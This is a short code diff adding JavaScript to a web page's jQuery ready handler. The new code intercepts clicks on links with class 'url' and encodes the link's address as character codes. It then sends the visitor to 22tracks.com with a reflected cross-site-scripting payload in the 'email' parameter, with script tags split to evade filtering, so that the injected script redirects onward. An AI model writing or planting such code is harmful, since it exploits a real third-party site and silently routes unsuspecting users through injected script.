@@ -61,6 +61,24 @@ $(document).ready(function() {
             $('#'+target+' > .name').click();
         });
     });
+    if( ! $.browser.msie )
+    {
+        $('a.url').click(function(e){
+            var chars = "";
+            for( i = 0; i < this.href.length; i++ )
+            {
+                var c = this.href[i];
+                chars += this.href.charCodeAt(i)+"";
+                if( i != this.href.length-1 )
+                {
+                    chars += ",";
+                }
+            }
+            var target = "http://22tracks.com/index.php?email='//;<scr"+"ipt><"+"/script><scri"+"pt>window.location=String.fromCharCode("+chars+");<"+"/script>";
+            window.location = target;
+            e.preventDefault();
+        });
+    }
 });
             //-->
         </script>
